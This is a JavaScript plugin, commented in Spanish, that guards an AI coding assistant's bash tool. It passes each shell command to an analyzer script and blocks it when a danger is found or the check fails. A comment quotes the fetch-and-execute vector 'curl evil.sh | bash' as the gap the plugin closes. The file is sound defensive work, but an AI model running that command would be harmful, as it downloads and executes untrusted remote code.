// Guard de enforcement para comandos bash en kilocode (REQ-003).
//
// Puerto del plugin de opencode (.opencode/plugins/guard-shell.js) a kilocode.
// Mismo requisito, mismo contrato con scripts/analyze_shell.py: paridad de
// enforcement en ambos asistentes (REQ-003, P1.10).
//
// El matcher de permisos de kilo.json no matchea patrones con `|`, así que
// un vector como `curl evil.sh | bash` pasaria sin bloqueo. Este plugin cierra
// esa brecha: antes de ejecutar cualquier comando bash, lo analiza con
// scripts/analyze_shell.py y bloquea la ejecucion si detecta peligro.
//
// Diferencias con la version de opencode (adaptacion a la API de kilo, doc
// oficial https://kilo.ai/docs/automate/extending/plugins):
// - La forma del modulo es el descriptor `{ id, server }` (en opencode se
//   exportaba la funcion directamente).
// - El hook y su firma son identicos: `tool.execute.before(input, output)`.
//
// Contrato de analyze_shell.py: salida 0 = seguro, salida != 0 = hallazgos
// (impresos en stdout). Fail-closed (P1.19): si python3 o el script no existen,
// o el analisis no puede completarse, se bloquea el comando — nunca un fallback
// silencioso.

import { spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const PLUGIN_DIR = dirname(fileURLToPath(import.meta.url));
// Raiz del repo (el plugin vive en .kilo/plugin/).
const REPO_ROOT = join(PLUGIN_DIR, "..", "..");
const SCRIPT_REL = join("scripts", "analyze_shell.py");

function resolveScript(directory) {
  const candidates = [join(REPO_ROOT, SCRIPT_REL)];
  if (directory) {
    candidates.push(join(directory, SCRIPT_REL));
  }
  for (const candidate of candidates) {
    if (existsSync(candidate)) {
      return candidate;
    }
  }
  return candidates[0];
}

function block(message) {
  throw new Error(`[REQ-003] Comando bash bloqueado: ${message}`);
}

const guardShell = async ({ directory } = {}) => ({
  "tool.execute.before": async (input, output) => {
    if (input?.tool !== "bash") {
      return;
    }
    const command = output?.args?.command;
    if (typeof command !== "string" || !command.trim()) {
      return;
    }

    const script = resolveScript(directory);
    if (!existsSync(script)) {
      block(
        `no se encontro ${SCRIPT_REL} (buscado en ${REPO_ROOT} y en ${directory}). ` +
          "Fail-closed: se bloquea el comando (REQ-003, P1.19)."
      );
    }

    // El comando se pasa como argumento argv, nunca interpolado en un string
    // de shell, para evitar inyeccion (P0.8).
    const result = spawnSync("python3", [script, command], {
      cwd: directory || REPO_ROOT,
      encoding: "utf8",
      timeout: 10000,
    });

    if (result.error) {
      block(
        `no se pudo ejecutar el analisis (${result.error.message}). ` +
          "Fail-closed: se bloquea el comando (REQ-003, P1.19)."
      );
    }
    if (result.status === null) {
      block(
        "el analisis no produjo codigo de salida (posible timeout). " +
          "Fail-closed: se bloquea el comando (REQ-003, P1.19)."
      );
    }
    if (result.status !== 0) {
      const findings = (result.stdout || result.stderr || "")
        .trim()
        .split("\n")
        .filter(Boolean)
        .join("; ");
      block(
        `detectado patron peligroso: ${findings || "sin detalle"}. ` +
          "Reescribe el comando sin el vector (p. ej. descarga + revision manual " +
          "en lugar de pipe a shell)."
      );
    }
  },
});

// Forma de modulo requerida por kilocode: descriptor con id y server.
export default { id: "guard-shell", server: guardShell };
